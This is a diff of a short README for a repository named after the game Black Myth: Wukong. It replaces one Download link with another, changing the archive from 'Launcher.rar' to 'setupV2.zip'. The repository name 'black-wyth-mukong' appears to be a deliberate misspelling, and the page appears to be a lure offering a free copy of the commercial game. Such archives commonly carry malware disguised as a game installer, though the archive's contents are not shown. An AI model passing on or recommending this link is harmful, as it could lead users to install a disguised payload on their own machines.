@@ -1,6 +1,6 @@
 # black-myth-wukong
 
-*** [Download](https://github.com/wil-cod1/black-wyth-mukong/releases/download/download/Launcher.rar) ***
+*** [Download](https://github.com/wil-cod1/black-wyth-mukong/releases/download/download/setupV2.zip) ***
 
 
 ![687474_1](https://github.com/user-attachments/assets/35d7733d-05b3-47df-a41e-77b5edc2ade4)
